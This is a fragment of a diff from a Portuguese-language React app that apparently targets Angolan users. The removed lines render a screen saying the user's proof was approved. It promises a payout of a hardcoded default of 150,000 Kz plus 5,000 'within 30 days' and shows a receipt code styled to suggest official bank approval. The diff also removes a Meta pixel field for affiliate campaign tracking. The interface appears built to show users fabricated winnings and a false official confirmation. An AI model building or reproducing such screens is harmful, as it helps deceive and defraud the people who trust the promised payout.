-                        A sua verificação foi concluída com sucesso e o saldo total aprovado de <strong className="text-emerald-400 font-mono">{((stats.accumulatedKz || 150000) + 5000).toLocaleString('pt-AO')} Kz</strong> foi inserido no lote de processamento faseado para liquidação garantida na sua conta de destino.
-                      </p>
-
-                      <div className="bg-emerald-950/80 p-3 sm:p-4 rounded-xl border border-emerald-900 text-[10px] sm:text-xs text-zinc-300 space-y-1.5 uppercase font-mono tracking-tight">
-                        <div>💵 TOTAL A DEPOSITAR: <span className="text-emerald-400 font-bold">{((stats.accumulatedKz || 150000) + 5000).toLocaleString('pt-AO')} Kz</span></div>
-                        <div>📁 ESTADO DA OPERAÇÃO: <span className="text-emerald-400 font-black">COMPROVATIVO APROVADO COM SUCESSO</span></div>
-                        <div>⏱️ PRAZO DE LIQUIDAÇÃO: <span className="text-amber-400 font-black">EM ATÉ 30 DIAS</span></div>
-                        <div className="text-[9px] text-zinc-500 pt-1 border-t border-emerald-900/40">CÓDIGO DE RECIBO: BNA-OK-PROC_30D_VAL_EMIS</div>
-                      </div>
-                    </div>
-
-                    <div className="flex justify-center pt-2">
-                      <button 
-                        onClick={() => {
-                          setUploadedFile(null);
-                          setUploadStatus('idle');
-                          setUploadProgress(0);
-                          setGameState(GameState.HOME);
-                        }}
-                        className="px-8 py-4 bg-gradient-to-r from-emerald-500 to-green-600 hover:from-emerald-600 hover:to-green-700 text-black font-black rounded-xl uppercase text-xs tracking-wider border-b-4 border-emerald-800 active:scale-95 transition-all cursor-pointer shadow-lg hover:scale-[1.02]"
-                      >
-                        🏠 VOLTAR À PÁGINA INICIAL
-                      </button>
-                    </div>
                   </div>
                 ) : (
                   /* High tech parsing HUD screen during validation phase */
@@ -2318,22 +2122,6 @@ const App: React.FC = () => {
                   placeholder="Ex: 902 415 832" 
                   className="w-full bg-black border-2 border-zinc-800 rounded-xl p-3.5 outline-none text-white font-mono text-center font-black text-sm uppercase focus:border-angola-yellow transition-all"
                 />
-              </div>
-
-              <div>
-                <label className="text-[9px] sm:text-[10px] font-black tracking-widest text-zinc-400 uppercase block mb-1">
-                  ID DO PIXEL DO META (OPCIONAL)
-                </label>
-                <input 
-                  type="text" 
-                  value={tempPixelId} 
-                  onChange={(e) => setTempPixelId(e.target.value)}
-                  placeholder="Ex: 123456789012345" 
-                  className="w-full bg-black border-2 border-zinc-800 rounded-xl p-3.5 outline-none text-white font-mono text-center font-black text-sm uppercase focus:border-angola-yellow transition-all"
-                />
-                <p className="text-[8px] text-zinc-500 font-bold uppercase mt-1 leading-normal">
-                  Dica: Também pode forçar via URL usando ?pixel=ID_AQUI para campanhas de afiliado!
-                </p>
               </div>
             </div>
 
